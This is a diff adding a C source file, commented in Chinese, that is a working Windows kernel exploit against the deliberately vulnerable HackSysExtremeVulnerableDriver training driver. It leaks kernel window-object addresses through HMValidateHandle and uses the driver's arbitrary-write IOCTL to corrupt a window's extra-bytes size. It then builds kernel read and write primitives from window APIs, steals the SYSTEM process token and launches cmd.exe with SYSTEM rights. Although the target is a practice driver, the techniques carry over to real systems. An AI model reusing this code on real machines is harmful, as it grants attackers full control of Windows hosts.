@@ -1,0 +1,218 @@
+#include <windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
+lHMValidateHandle pHmValidateHandle = NULL;
+typedef struct _HEAD
+{
+	HANDLE h;
+	DWORD  cLockObj;
+} HEAD, *PHEAD;
+typedef struct _THROBJHEAD
+{
+	HEAD h;
+	PVOID ethread;
+} THROBJHEAD, *PTHROBJHEAD;
+typedef struct _THRDESKHEAD
+{
+	THROBJHEAD h;
+	PVOID    rpdesk;
+	PVOID       pSelf;  
+} THRDESKHEAD, *PTHRDESKHEAD;
+ULONG64 strNameaddr;
+BOOL FindHMValidateHandle() {
+	HMODULE hUser32 = LoadLibraryA("user32.dll");
+	if (hUser32 == NULL) {
+		printf("Failed to load user32");
+		return FALSE;
+	}
+	//IsMenu用来确定句柄是否为菜单句柄
+	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
+	if (pIsMenu == NULL) {
+		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
+		return FALSE;
+	}
+	//由于HMValidateHandleOffset函数位于IsMenu中，IsMenu中特征码为e8也就是一个call就是HMValidateHandleOffset函数地址
+	unsigned int uiHMValidateHandleOffset = 0;
+	for (unsigned int i = 0; i < 0x1000; i++) {
+		BYTE* test = pIsMenu + i;
+		if (*test == 0xE8) {
+			uiHMValidateHandleOffset = i + 1;
+			break;
+		}
+	}
+	if (uiHMValidateHandleOffset == 0) {
+		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
+		return FALSE;
+	}
+
+	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
+	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
+	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
+	return TRUE;
+}
+
+LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	return DefWindowProc(hWnd, uMsg, wParam, lParam);
+}
+
+DWORD32 ReadMemory32(HWND hManager, HWND Worker, DWORD64 addr) {
+	//保存原来的数据
+	DWORD dwori3 = GetWindowLong(hManager, strNameaddr + 0x8);
+	DWORD dwori4 = GetWindowLong(hManager, strNameaddr + 0xc);
+	//写入数据修改原来的指针
+	SetWindowLongW(hManager, strNameaddr + 0x8, (addr & 0xffffffff));
+	SetWindowLongW(hManager, strNameaddr + 0xc, (addr & 0xffffffff00000000) >> 32);
+	
+	//向指针指向的地方读取数据
+	ULONG32 Read[6]{};
+	InternalGetWindowText(Worker, (LPWSTR)&Read, 4);
+	//还原原来的数据
+	SetWindowLongW(hManager, strNameaddr + 0x8, dwori3);
+	SetWindowLongW(hManager, strNameaddr + 0xc, dwori4);
+	
+
+	return Read[0];
+}
+VOID ReadMemory64(HWND hManager, HWND Worker, DWORD64 addr, PVOID dst,DWORD64 len) {
+	ULONG32 LowAddr = ReadMemory32(hManager, Worker, addr);
+	ULONG64 HighAddr = ReadMemory32(hManager, Worker, addr + sizeof(ULONG32));
+	HighAddr *= 0x100000000;
+	ULONG64 read = HighAddr + LowAddr;
+	*(DWORD64*)dst= read;
+	if (len==0x10)
+	{
+		 LowAddr = ReadMemory32(hManager, Worker, addr + 8);
+		 HighAddr = ReadMemory32(hManager, Worker, addr + 8 + sizeof(ULONG32));
+		 read = HighAddr + LowAddr;
+		 *(DWORD64*)((DWORD64)dst+8) = read;
+	}
+}
+VOID WriteMemory(HWND hManager, HWND Worker, DWORD64 addr, DWORD64  src) {
+	//保存原来的数据
+	DWORD dwori3 = GetWindowLong(hManager, strNameaddr + 0x8);
+	DWORD dwori4 = GetWindowLong(hManager, strNameaddr + 0xC);
+	//写入数据修改原来的指针
+	SetWindowLongW(hManager, strNameaddr + 0x8, (addr & 0xffffffff));
+	SetWindowLongW(hManager, strNameaddr + 0xC, (addr & 0xffffffff00000000) >> 32);
+	//向指针指向的地方写入数据
+	ULONG64 TempValue[2] = { 0 };
+	TempValue[0] = src;
+	SetWindowTextW(Worker, (PWCHAR)TempValue);
+	//还原原来的数据
+	SetWindowLongW(hManager, strNameaddr + 0x8, dwori3);
+	SetWindowLongW(hManager, strNameaddr + 0xC, dwori4);
+}
+int main()
+{
+
+	BOOL bFound = FindHMValidateHandle();
+	printf("HmValidateHandle=%llX\n", pHmValidateHandle);
+	if (!bFound) {
+		printf("Failed to locate HmValidateHandle, exiting\n");
+		return 1;
+	}
+	WNDCLASSEX wnd = { 0x0 };
+	wnd.cbWndExtra = 0x100;
+	wnd.cbSize = sizeof(wnd);
+	wnd.lpszClassName = TEXT("MainWClass");
+	wnd.lpfnWndProc = MainWProc;
+	RegisterClassEx(&wnd);
+	WNDCLASSEX wndb = { 0x0 };
+	wndb.cbWndExtra = 0x200;
+	wndb.cbSize = sizeof(wndb);
+	wndb.lpszClassName = TEXT("MainWClassB");
+	wndb.lpfnWndProc = MainWProc;
+	RegisterClassEx(&wndb);
+	HWND Manager = CreateWindowEx(0, wnd.lpszClassName,L"a", 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, 0, 0);
+	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(Manager, 1);
+	HWND Worker= CreateWindowEx(0, wndb.lpszClassName, L"abcd", 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, 0, 0);
+	PTHRDESKHEAD tagWND2 = (PTHRDESKHEAD)pHmValidateHandle(Worker, 1);
+	/*getchar();
+	DebugBreak();*/
+	ULONG64 tagWNDaddr = (ULONG64)tagWND->pSelf;
+	ULONG64 tagWND2addr = (ULONG64)tagWND2->pSelf;
+	//这里因为可能获得的第二个地址比第一个小，需要换一下位置
+	if (tagWNDaddr > tagWND2addr)
+	{
+		ULONG64 temp = tagWND2addr;
+		tagWND2addr = tagWNDaddr;
+		tagWNDaddr = temp;
+		HWND temp2 = Worker;
+		Worker = Manager;
+		Manager = temp2;
+	}
+	//pSelf对应tagWND内核地址 ethread对应的就是ethread
+	printf("tagWNDaddr: %llX\n", tagWNDaddr);
+	printf("tagWND2addr: %llX\n", tagWND2addr);
+
+	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return(-1);
+	}
+	DWORD64 buf[2];
+	//+0xe8 cbwndExtra
+	buf[1] = ((ULONG64)tagWNDaddr + 0xe8);
+	ULONG64 temp = 0x12345678910;
+	buf[0] = (ULONG64)&temp;
+	printf("tcbwndExtraSize=%llX\n", *(ULONG64*)*buf);
+	LPDWORD dwBytesOut{};
+	//修改变量
+	DeviceIoControl(hDriver, 0x22200b, buf, 0x10, 0, 0, dwBytesOut, NULL);
+
+	//+0xd8 strName 0x178是整个1511下tagWND结构的大小  win7sp1下则是0x128
+	strNameaddr = (tagWND2addr + 0xd8) - (tagWNDaddr + 0x178);
+	printf("strNameaddr=%llX\n", strNameaddr);
+
+	LPVOID lpImageBase[1024];
+	DWORD lpcbNeeded;
+	TCHAR lpfileName[1024];
+	PVOID64 UserBase;
+	HMODULE nbase;
+	ULONG64 address;
+	ULONG64 PsInitialSystemProcess;
+	//遍历模块
+	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
+	//获取第一个模块地址
+	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
+	UserBase = lpImageBase[0];
+	nbase = LoadLibrary(L"ntoskrnl.exe");
+	printf("UserBase=%llX\n", UserBase);
+	address = (ULONG64)GetProcAddress(nbase, "PsInitialSystemProcess");
+	//PsInitialSystemProcess 是一个指向system EPROCESS的指针
+	PsInitialSystemProcess = ((ULONG64)address - (ULONG64)nbase + (ULONG64)UserBase);
+	printf("PsInitialSystemProcess=%llX\n", PsInitialSystemProcess);
+
+	LIST_ENTRY ActiveProcessLinks{};
+	DWORD64 currentProcess;//当前进程eporcess
+	ULONG64 UniqueProcessId;
+	ULONG64 SystemProcess{};
+
+	ReadMemory64(Manager, Worker, PsInitialSystemProcess,
+		&SystemProcess, sizeof(LPVOID));
+	DWORD dwCurrentPID;
+	//+0x2f0 ActiveProcessLinks : _LIST_ENTRY
+	ReadMemory64(Manager, Worker, SystemProcess + 0x2f0, &ActiveProcessLinks, sizeof(LIST_ENTRY));
+	do
+	{
+		currentProcess = (DWORD64)((PUCHAR)ActiveProcessLinks.Flink - 0x2f0);
+		ReadMemory64(Manager, Worker, currentProcess + 0x2e8, &UniqueProcessId, sizeof(LPVOID));
+		dwCurrentPID = LOWORD(UniqueProcessId);
+		ReadMemory64(Manager, Worker, currentProcess + 0x2f0, &ActiveProcessLinks, sizeof(LIST_ENTRY));
+	} while (dwCurrentPID != GetCurrentProcessId());
+	ULONG64 systemtoken{};
+	//+0x358 Token            : _EX_FAST_REF
+	printf("eProcessToken=%llX\n", currentProcess + 0x358);
+	ReadMemory64(Manager, Worker, SystemProcess + 0x358,
+		&systemtoken, sizeof(LPVOID));
+	printf("systemtoken=%llX\n", systemtoken);
+	WriteMemory(Manager, Worker, currentProcess + 0x358,
+		systemtoken);
+	system("cmd.exe");
+	getchar();
+	return 0;
+}
